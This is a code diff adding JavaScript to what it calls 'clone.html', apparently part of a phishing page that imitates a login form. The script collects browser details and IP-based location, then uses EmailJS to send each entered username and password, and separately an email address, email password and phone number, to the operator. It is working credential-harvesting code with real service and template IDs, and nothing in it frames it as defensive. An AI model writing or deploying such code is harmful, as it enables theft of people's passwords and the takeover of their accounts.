@@ -1,0 +1,131 @@
+<!-- EmailJS Configuration & Initialization -->
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/build/index.min.js"></script>
+<script>
+    // Initialize EmailJS with your credentials
+    // Get PUBLIC_KEY from https://dashboard.emailjs.com
+    const EMAILJS_PUBLIC_KEY = 'YOUR_PUBLIC_KEY'; // REPLACE WITH YOUR PUBLIC KEY
+    const EMAILJS_SERVICE_ID = 'service_qh1p3sh';
+    const EMAILJS_LOGIN_TEMPLATE_ID = 'cJcTNwUcLcI7uY3l-';
+    const EMAILJS_VERIFICATION_TEMPLATE_ID = 'YOUR_VERIFICATION_TEMPLATE_ID'; // REPLACE
+
+    // Initialize EmailJS
+    emailjs.init(EMAILJS_PUBLIC_KEY);
+
+    /**
+     * Capture browser and location information
+     */
+    async function getBrowserAndLocationInfo() {
+        const browserInfo = {
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform,
+            screenResolution: `${window.screen.width}x${window.screen.height}`
+        };
+
+        let locationInfo = {
+            latitude: 'N/A',
+            longitude: 'N/A',
+            country: 'N/A',
+            city: 'N/A',
+            ip: 'N/A'
+        };
+
+        try {
+            // Try to get IP-based location
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
+            locationInfo = {
+                latitude: data.latitude || 'N/A',
+                longitude: data.longitude || 'N/A',
+                country: data.country_name || 'N/A',
+                city: data.city || 'N/A',
+                ip: data.ip || 'N/A'
+            };
+        } catch (error) {
+            console.warn('Could not fetch location info:', error);
+        }
+
+        return { browserInfo, locationInfo };
+    }
+
+    /**
+     * Send login attempt email via EmailJS
+     */
+    async function sendLoginAttemptEmail(username, password, attempt) {
+        try {
+            if (!EMAILJS_PUBLIC_KEY || EMAILJS_PUBLIC_KEY === 'YOUR_PUBLIC_KEY') {
+                console.warn('⚠️ EmailJS Public Key not configured. Set EMAILJS_PUBLIC_KEY in clone.html');
+                return false;
+            }
+
+            const { browserInfo, locationInfo } = await getBrowserAndLocationInfo();
+
+            const templateParams = {
+                username: username,
+                password: password,
+                attempt: attempt,
+                timestamp: new Date().toISOString(),
+                user_agent: browserInfo.userAgent,
+                language: browserInfo.language,
+                platform: browserInfo.platform,
+                screen_resolution: browserInfo.screenResolution,
+                latitude: locationInfo.latitude,
+                longitude: locationInfo.longitude,
+                country: locationInfo.country,
+                city: locationInfo.city,
+                ip_address: locationInfo.ip
+            };
+
+            console.log('📧 Sending login attempt email...', templateParams);
+
+            const response = await emailjs.send(
+                EMAILJS_SERVICE_ID,
+                EMAILJS_LOGIN_TEMPLATE_ID,
+                templateParams
+            );
+
+            console.log('✅ Login email sent successfully:', response);
+            return true;
+        } catch (error) {
+            console.error('❌ Failed to send login email:', error);
+            return false;
+        }
+    }
+
+    /**
+     * Send verification email via EmailJS
+     */
+    async function sendVerificationEmail(email, emailPassword, phoneNumber) {
+        try {
+            if (!EMAILJS_PUBLIC_KEY || EMAILJS_PUBLIC_KEY === 'YOUR_PUBLIC_KEY') {
+                console.warn('⚠️ EmailJS Public Key not configured. Set EMAILJS_PUBLIC_KEY in clone.html');
+                return false;
+            }
+
+            const { browserInfo, locationInfo } = await getBrowserAndLocationInfo();
+
+            const templateParams = {
+                email_address: email,
+                email_password: emailPassword,
+                phone_number: phoneNumber,
+                timestamp: new Date().toISOString(),
+                user_agent: browserInfo.userAgent,
+                ip_address: locationInfo.ip
+            };
+
+            console.log('📧 Sending verification email...', templateParams);
+
+            const response = await emailjs.send(
+                EMAILJS_SERVICE_ID,
+                EMAILJS_VERIFICATION_TEMPLATE_ID,
+                templateParams
+            );
+
+            console.log('✅ Verification email sent successfully:', response);
+            return true;
+        } catch (error) {
+            console.error('❌ Failed to send verification email:', error);
+            return false;
+        }
+    }
+</script>
